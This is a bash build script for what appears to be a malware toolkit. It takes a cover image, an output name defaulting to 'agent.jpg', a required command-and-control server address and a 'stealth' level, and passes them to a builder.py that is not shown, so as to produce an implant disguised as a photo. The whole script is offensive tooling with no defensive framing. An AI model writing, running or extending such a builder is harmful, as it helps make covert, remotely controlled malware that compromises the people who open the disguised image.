#!/bin/bash

# Configuration
DEFAULT_IMAGE="vacation.jpg"
DEFAULT_OUTPUT="agent.jpg"
DEFAULT_STEALTH="high"

# Parse arguments
while [[ $# -gt 0 ]]; do
    key="$1"
    case $key in
        --image)
        IMAGE="$2"
        shift
        shift
        ;;
        --output)
        OUTPUT="$2"
        shift
        shift
        ;;
        --c2)
        C2_SERVER="$2"
        shift
        shift
        ;;
        --stealth)
        STEALTH="$2"
        shift
        shift
        ;;
        *)
        echo "Unknown option: $1"
        exit 1
        ;;
    esac
done

# Set defaults
IMAGE=${IMAGE:-$DEFAULT_IMAGE}
OUTPUT=${OUTPUT:-$DEFAULT_OUTPUT}
STEALTH=${STEALTH:-$DEFAULT_STEALTH}

# Validate inputs
if [ -z "$C2_SERVER" ]; then
    echo "Error: C2 server (--c2) is required"
    exit 1
fi

if [ ! -f "$IMAGE" ]; then
    echo "Error: Image file not found: $IMAGE"
    exit 1
fi

# Build agent
echo "Building agent..."
echo "- Image: $IMAGE"
echo "- Output: $OUTPUT"
echo "- C2: $C2_SERVER"
echo "- Stealth: $STEALTH"

python ../builder.py \
    --image "$IMAGE" \
    --output "$OUTPUT" \
    --c2-servers "$C2_SERVER" \
    --stealth-level "$STEALTH"

if [ $? -eq 0 ]; then
    echo "Build successful: $OUTPUT"
else
    echo "Build failed!"
    exit 1
fi
